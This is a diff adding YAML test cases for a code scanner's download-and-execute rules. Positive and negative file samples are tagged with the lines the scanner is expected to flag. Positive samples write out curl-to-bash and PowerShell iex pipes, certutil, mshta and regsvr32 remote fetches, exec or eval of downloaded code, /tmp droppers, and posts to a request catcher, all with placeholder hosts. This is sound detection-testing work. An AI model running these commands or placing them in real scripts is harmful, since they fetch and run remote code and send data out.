@@ -1,0 +1,155 @@
+# Test cases for area download_exec. Files are created under tmp_path only; all URLs
+# use placeholder domains (example.invalid) or non-routable addresses and nothing is
+# ever executed.
+
+RC-DLX-001:
+  positive:
+    - name: curl piped into bash in a shell script
+      files:
+        scripts/install.sh: |
+          #!/bin/sh
+          curl -fsSL https://example.invalid/i.sh | bash
+      expect: [{path: scripts/install.sh, line: 2}]
+    - name: PowerShell download piped into iex
+      files:
+        setup.ps1: |
+          iwr https://example.invalid/a.ps1 -UseBasicParsing | iex
+      expect: [{path: setup.ps1, line: 1}]
+    - name: Python runs a download through a shell
+      files:
+        tools/bootstrap.py: |
+          os.system("wget -qO- https://example.invalid/x.sh | sh")
+      expect: [{path: tools/bootstrap.py, line: 1}]
+  negative:
+    - name: download piped into a shell in a comment
+      files:
+        install.ps1: |
+          # Users can rerun irm https://example.invalid/i.ps1 | iex in the same session.
+    - name: attack string in a test module
+      files:
+        tests/test_scanner.py: |
+          SAMPLE = "curl -s https://example.invalid/x.sh | sh"
+    - name: install instructions in a README
+      files:
+        README.md: |
+          curl -fsSL https://example.invalid/i.sh | bash
+    - name: download to a file without running it
+      files:
+        fetch.sh: |
+          curl -fsSL -o data.json https://example.invalid/data.json
+    - name: Dockerfile (runs inside the container build)
+      files:
+        Dockerfile: |
+          RUN curl -fsSL https://example.invalid/setup.sh | bash -
+
+RC-DLX-002:
+  positive:
+    - name: certutil downloads a file
+      files:
+        get.bat: |
+          certutil -urlcache -split -f http://example.invalid/a.exe a.exe
+      expect: [{path: get.bat, line: 1}]
+    - name: mshta runs a remote HTA
+      files:
+        run.cmd: |
+          mshta https://example.invalid/x.hta
+      expect: [{path: run.cmd, line: 1}]
+    - name: regsvr32 scriptlet from a URL
+      files:
+        go.ps1: |
+          regsvr32 /s /n /u /i:https://example.invalid/x.sct scrobj.dll
+      expect: [{path: go.ps1, line: 1}]
+  negative:
+    - name: certutil computes a hash
+      files:
+        verify.bat: |
+          certutil -hashfile release.zip SHA256
+    - name: regsvr32 registers a local DLL
+      files:
+        register.cmd: |
+          regsvr32 /s mylib.dll
+
+RC-DLX-003:
+  positive:
+    - name: Python executes a web response
+      files:
+        update.py: |
+          import requests
+          exec(requests.get("https://example.invalid/patch.py").text)
+      expect: [{path: update.py, line: 2}]
+    - name: JavaScript evaluates fetched code
+      files:
+        load.mjs: |
+          eval(await (await fetch("https://example.invalid/x.js")).text());
+      expect: [{path: load.mjs, line: 1}]
+  negative:
+    - name: JSON from a web request
+      files:
+        client.py: |
+          data = requests.get("https://example.invalid/api").json()
+    - name: exec without a download
+      files:
+        run.py: |
+          exec(compile(source, "plugin.py", "exec"))
+
+RC-DLX-004:
+  positive:
+    - name: download into /tmp and make executable
+      files:
+        drop.sh: |
+          #!/bin/sh
+          curl -s -o /tmp/agent https://example.invalid/agent
+          chmod +x /tmp/agent
+          /tmp/agent
+      expect: [{path: drop.sh, line: 3}]
+    - name: PowerShell starts a downloaded file from TEMP
+      files:
+        drop.ps1: |
+          Invoke-WebRequest https://example.invalid/a.exe -OutFile "$env:TEMP\a.exe"
+          Start-Process "$env:TEMP\a.exe"
+      expect: [{path: drop.ps1, line: 2}]
+  negative:
+    - name: chmod on a temp file without any download
+      files:
+        build.sh: |
+          cp tool /tmp/tool
+          chmod +x /tmp/tool
+    - name: download into /tmp without running it
+      files:
+        cache.sh: |
+          curl -s -o /tmp/data.json https://example.invalid/data.json
+          chmod +x ./bin/tool
+
+RC-DLX-005:
+  positive:
+    - name: data posted to a request catcher
+      files:
+        telemetry.py: |
+          requests.post("https://webhook.site/0000-test", data=info)
+      expect: [{path: telemetry.py, line: 1}]
+    - name: raw public IP address
+      files:
+        beacon.js: |
+          fetch("http://240.0.0.7/c");
+      expect: [{path: beacon.js, line: 1}]
+  negative:
+    - name: public resolvers, carrier-grade NAT and example.com addresses
+      files:
+        net.py: |
+          PROBE = "http://8.8.8.8"
+          PROXY = "http://100.68.58.50:3128"
+          EXAMPLE = "https://93.184.215.14/"
+    - name: local and private addresses
+      files:
+        dev.py: |
+          URL = "http://127.0.0.1:8000"
+          LAN = "http://192.168.1.10/api"
+          DOC = "http://192.0.2.10/"
+    - name: ordinary API host
+      files:
+        api.ts: |
+          const base = "https://api.example.invalid/v1";
+    - name: webhook in documentation
+      files:
+        docs/integrations.md: |
+          Send events to https://hooks.slack.com/services/T000/B000/XXXX
